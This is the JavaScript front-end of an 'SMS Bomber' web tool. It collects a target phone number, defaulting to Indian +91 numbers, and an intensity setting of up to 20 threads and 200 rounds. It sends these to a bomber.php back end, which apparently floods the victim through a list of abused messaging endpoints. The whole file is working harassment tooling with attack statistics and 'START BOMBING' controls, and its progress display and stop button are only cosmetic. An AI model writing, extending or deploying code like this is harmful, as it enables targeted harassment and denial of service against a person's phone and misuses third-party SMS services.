// SMS Bomber Web - Frontend Controller

let bombingInterval = null;
let isBombing = false;

// Intensity mapping
const intensityMap = {
    1: { threads: 5, rounds: 50, name: 'Very Low' },
    2: { threads: 8, rounds: 75, name: 'Low' },
    3: { threads: 10, rounds: 100, name: 'Moderate' },
    4: { threads: 15, rounds: 150, name: 'High' },
    5: { threads: 20, rounds: 200, name: 'Extreme' }
};

// DOM Elements
const phoneInput = document.getElementById('phone');
const intensitySlider = document.getElementById('intensity');
const intensityInfo = document.getElementById('intensityInfo');
const startBtn = document.getElementById('startBtn');
const stopBtn = document.getElementById('stopBtn');
const progressSection = document.getElementById('progressSection');
const progressFill = document.getElementById('progressFill');
const statusText = document.getElementById('statusText');
const resultSection = document.getElementById('resultSection');
const resultsDiv = document.getElementById('results');

// Update intensity display
intensitySlider.addEventListener('input', function() {
    const val = this.value;
    const config = intensityMap[val];
    intensityInfo.textContent = `${config.name} - ${config.threads} threads, ${config.rounds} rounds`;
});

// Load statistics
async function loadStats() {
    try {
        const response = await fetch('bomber.php?stats=1');
        const data = await response.json();
        
        // Also fetch active endpoints count
        const endpointsRes = await fetch('endpoints.json');
        const endpointsData = await endpointsRes.json();
        
        document.getElementById('totalAttacks').textContent = data.total_attacks || 0;
        document.getElementById('totalMessages').textContent = data.total_messages || 0;
        document.getElementById('activeEndpoints').textContent = endpointsData.endpoints?.length || 0;
    } catch(e) {
        console.error('Stats load error:', e);
    }
}

// Start bombing
async function startBombing() {
    let phone = phoneInput.value.trim();
    
    if (!phone) {
        alert('Please enter a target phone number');
        return;
    }
    
    // Format phone number
    if (phone.match(/^[0-9]{10}$/)) {
        phone = '+91' + phone;
    } else if (phone.match(/^91[0-9]{10}$/)) {
        phone = '+' + phone;
    } else if (!phone.match(/^\+[0-9]{10,15}$/)) {
        alert('Invalid phone number format. Use: +91XXXXXXXXXX or just 10 digits for India');
        return;
    }
    
    const intensity = intensitySlider.value;
    const config = intensityMap[intensity];
    
    // UI updates
    startBtn.disabled = true;
    startBtn.textContent = '🔥 BOMBING IN PROGRESS... 🔥';
    stopBtn.disabled = false;
    progressSection.style.display = 'block';
    resultSection.style.display = 'none';
    progressFill.style.width = '0%';
    
    isBombing = true;
    let currentRound = 0;
    const totalRounds = config.threads;
    
    // Simulate progress for UI feedback
    const progressInterval = setInterval(() => {
        if (!isBombing) {
            clearInterval(progressInterval);
            return;
        }
        currentRound++;
        const percent = (currentRound / totalRounds) * 100;
        progressFill.style.width = percent + '%';
        statusText.textContent = `Attack in progress... Round ${currentRound}/${totalRounds}`;
        
        if (currentRound >= totalRounds) {
            clearInterval(progressInterval);
        }
    }, 3000);
    
    try {
        const response = await fetch('bomber.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                action: 'bomb',
                phone: phone,
                threads: config.threads,
                rounds: config.rounds
            })
        });
        
        const result = await response.json();
        
        clearInterval(progressInterval);
        progressFill.style.width = '100%';
        
        if (result.success) {
            resultsDiv.innerHTML = `
                <div style="text-align: center;">
                    <p>✅ ${result.message}</p>
                    <p>📱 Target: ${result.phone}</p>
                    <p>✅ Successful: ${result.successful}</p>
                    <p>❌ Failed: ${result.failed}</p>
                    <p>📊 Total Attempts: ${result.total}</p>
                    <hr>
                    <small>Note: Actual delivery depends on carrier filters</small>
                </div>
            `;
        } else {
            resultsDiv.innerHTML = `<p style="color: #ff0040;">❌ Error: ${result.error}</p>`;
        }
        
        resultSection.style.display = 'block';
        statusText.textContent = 'Attack completed!';
        
        // Reload stats
        loadStats();
        
    } catch(e) {
        resultsDiv.innerHTML = `<p style="color: #ff0040;">❌ Network Error: ${e.message}</p>`;
        resultSection.style.display = 'block';
        statusText.textContent = 'Attack failed!';
    }
    
    startBtn.disabled = false;
    startBtn.textContent = '🔥 START BOMBING 🔥';
    stopBtn.disabled = true;
    isBombing = false;
}

// Stop bombing
function stopBombing() {
    isBombing = false;
    statusText.textContent = 'Stopping attack...';
    setTimeout(() => {
        statusText.textContent = 'Attack stopped by user';
    }, 1000);
}

// Event listeners
startBtn.addEventListener('click', startBombing);
stopBtn.addEventListener('click', stopBombing);

// Load initial stats
loadStats();

// Refresh stats every 30 seconds
setInterval(loadStats, 30000);
